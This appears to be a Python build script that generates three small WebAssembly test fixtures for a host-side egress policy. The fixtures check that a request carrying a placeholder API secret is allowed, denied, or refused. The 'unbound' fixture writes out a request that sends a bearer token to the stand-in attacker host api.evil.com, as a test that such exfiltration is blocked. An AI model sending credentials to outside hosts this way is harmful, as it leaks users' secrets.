#!/usr/bin/env python3
"""Build the three curated WASI demo fixtures.

Each fixture is a tiny wasm module that imports `mvm:egress` and
`wasi_snapshot_preview1:proc_exit`, calls the host egress function with a
secret-bearing request, checks the response prefix, and exits.  The host
(Worker) implements `mvm:egress` using the same `mvm-contract` logic the
server backends use.
"""

import json
import subprocess
from pathlib import Path

FIXTURES = Path(__file__).parent


def wat_escape(s: str) -> str:
    """Escape a string for insertion into a WAT `data` segment."""
    return (
        s.replace("\\", "\\\\")
        .replace('"', '\\"')
        .replace("\n", "\\n")
        .replace("\r", "\\r")
        .replace("\t", "\\t")
    )


def build_fixture(name: str, request: dict, expected_prefix: str) -> None:
    request_json = json.dumps(request, separators=(",", ":"))
    req_bytes = request_json.encode("utf-8")
    pattern_bytes = expected_prefix.encode("utf-8")

    req_ptr = 0
    pattern_ptr = 20000
    resp_ptr = 8192
    resp_cap = 8192

    wat = f'''(module
  (import "wasi_snapshot_preview1" "proc_exit" (func $proc_exit (param i32)))
  (import "mvm" "egress" (func $mvm_egress (param i32 i32 i32 i32) (result i32)))
  (memory (export "memory") 3)
  (data (i32.const {req_ptr}) "{wat_escape(request_json)}")
  (data (i32.const {pattern_ptr}) "{wat_escape(expected_prefix)}")
  (func $_start
    (local $len i32)
    (local $i i32)
    (local.set $len
      (call $mvm_egress
        (i32.const {req_ptr}) (i32.const {len(req_bytes)})
        (i32.const {resp_ptr}) (i32.const {resp_cap})))
    (if (i32.lt_s (local.get $len) (i32.const 0))
      (then (call $proc_exit (i32.const 3))))
    (if (i32.lt_s (local.get $len) (i32.const {len(pattern_bytes)}))
      (then (call $proc_exit (i32.const 1))))
    (local.set $i (i32.const 0))
    (block $break
      (loop $loop
        (br_if $break (i32.ge_u (local.get $i) (i32.const {len(pattern_bytes)})))
        (if (i32.ne
              (i32.load8_u (i32.add (i32.const {resp_ptr}) (local.get $i)))
              (i32.load8_u (i32.add (i32.const {pattern_ptr}) (local.get $i))))
          (then (call $proc_exit (i32.const 2))))
        (local.set $i (i32.add (local.get $i) (i32.const 1)))
        (br $loop)))
    (call $proc_exit (i32.const 0)))
  (export "_start" (func $_start)))
'''

    wat_path = FIXTURES / f"{name}.wat"
    wasm_path = FIXTURES / f"{name}.wasm"
    opt_path = FIXTURES / f"{name}.opt.wasm"
    wat_path.write_text(wat)
    subprocess.run(["wasm-as", str(wat_path), "-o", str(wasm_path)], check=True)
    subprocess.run(["wasm-opt", "-Oz", str(wasm_path), "-o", str(opt_path)], check=True)
    print(f"{name}: {opt_path.stat().st_size} bytes ({wasm_path.stat().st_size} before opt)")


def main() -> None:
    build_fixture(
        "allowed",
        {
            "method": "POST",
            "url": "https://api.openai.com/v1/chat/completions",
            "headers": [["Authorization", "Bearer mvm-secret-deadbeef"]],
            "body_b64": "",
        },
        '{"result":"ok","status":200',
    )
    build_fixture(
        "denied",
        {
            "method": "POST",
            "url": "https://api.openai.com/v1/chat/completions",
            "headers": [["Authorization", "Bearer mvm-secret-deadbeef"]],
            "body_b64": "",
        },
        '{"result":"refused"',
    )
    build_fixture(
        "unbound",
        {
            "method": "POST",
            "url": "https://api.evil.com/v1/chat/completions",
            "headers": [["Authorization", "Bearer mvm-secret-deadbeef"]],
            "body_b64": "",
        },
        '{"result":"refused"',
    )


if __name__ == "__main__":
    main()
